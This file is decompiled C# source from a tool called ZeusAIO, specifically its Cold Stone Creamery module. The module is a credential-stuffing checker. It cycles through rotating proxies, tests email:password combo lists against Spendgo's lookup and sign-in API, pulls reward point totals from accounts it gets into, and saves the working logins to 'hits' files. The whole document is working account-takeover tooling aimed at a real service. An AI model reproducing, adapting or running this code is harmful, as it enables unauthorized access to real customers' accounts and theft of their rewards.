// Decompiled with JetBrains decompiler
// Type: ColdStoneCreamery.Check
// Assembly: ZeusAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 70786947-2129-410F-AE9A-C082629DAC36
// Assembly location: C:\Users\ofekt\Desktop\סורס\ZeusAIO.exe

using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using ZeusAIO;

namespace ColdStoneCreamery
{
  internal class Check
  {
    public static int threads = 0;
    public static string proxyprotocol = "";
    public static List<string> combos;
    public static List<string> proxies1;
    public static int proxytotal = 0;
    public static int combototal = 0;
    public static int free = 0;
    public static int comboindex = 0;
    public static int cpm = 0;
    public static int cpm_aux = 0;
    public static int check = 0;
    public static int error = 0;
    public static int hit = 0;
    public static int bad = 0;
    public static int h;
    public static int m;
    public static int s;

    public static bool CheckAccount(string[] s, string proxy)
    {
      for (int index = 0; index < Config.config.Retries + 1; ++index)
      {
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              proxy = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
              if (mainmenu.proxyProtocol == "HTTP")
                httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS4")
                httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS5")
                httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
              httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
              httpRequest.IgnoreProtocolErrors = true;
              httpRequest.AllowAutoRedirect = true;
              string str1 = "{\"email\":\"" + s[0] + "\"}";
              httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
              string str2 = httpRequest.Post("https://my.spendgo.com/consumer/gen/spendgo/v1/lookup", str1, "application/json;charset=UTF-8").ToString();
              if (!str2.Contains("{\"status\":\"NotFound\"}"))
              {
                if (str2.Contains("{\"status\":\"Activated\"}") || str2.Contains("{\"status\":\"Found\"}"))
                {
                  string str3 = "{\"value\":\"" + s[0] + "\",\"password\":\"" + s[1] + "\"}";
                  string source = httpRequest.Post("https://my.spendgo.com/consumer/gen/spendgo/v1/signin", str3, "application/json;charset=UTF-8").ToString();
                  if (!source.Contains("Member id /password incorrect"))
                  {
                    if (source.Contains("username\":\""))
                    {
                      string str4 = "{\"spendgo_id\":\"" + Check.Parse(source, "spendgo_id\":\"", "\",\"") + "\"}";
                      string input = httpRequest.Post("https://my.spendgo.com/consumer/gen/coldstone/v2/rewardsAndOffers", str4, "application/json;charset=UTF-8").ToString();
                      if (input.Contains("point_total"))
                      {
                        try
                        {
                          string str5 = Regex.Match(input, "point_total\":(.*?),").Groups[1].Value;
                          ++mainmenu.hits;
                          if (mainmenu.p1 == "2")
                            Colorful.Console.WriteLine("[HIT - COLDSTONE CREMERY] " + s[0] + ":" + s[1] + " | Points: " + str5, Color.Green);
                          Export.AsResult("/Coldstone_hits", s[0] + ":" + s[1] + " | Points: " + str5);
                          return false;
                        }
                        catch
                        {
                          ++mainmenu.hits;
                          if (mainmenu.p1 == "2")
                            Colorful.Console.WriteLine("[HIT - COLDSTONE CREMERY] " + s[0] + ":" + s[1] + " | Points: Error in Capture, YoBoi is dumb", Color.Green);
                          Export.AsResult("/Coldstone_hits_cap_error", s[0] + ":" + s[1]);
                          return false;
                        }
                      }
                      else
                      {
                        if (mainmenu.p1 == "2")
                          Colorful.Console.WriteLine("[FREE - COLDSTONE CREMERY] " + s[0] + ":" + s[1], Color.OrangeRed);
                        Export.AsResult("/Coldstone_frees", s[0] + ":" + s[1]);
                        return false;
                      }
                    }
                  }
                  else
                    break;
                }
                else
                  break;
              }
              else
                break;
            }
          }
          catch (Exception ex)
          {
            ++mainmenu.errors;
          }
        }
      }
      return false;
    }

    public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));

    private static string Parse(string source, string left, string right) => source.Split(new string[1]
    {
      left
    }, StringSplitOptions.None)[1].Split(new string[1]
    {
      right
    }, StringSplitOptions.None)[0];
  }
}
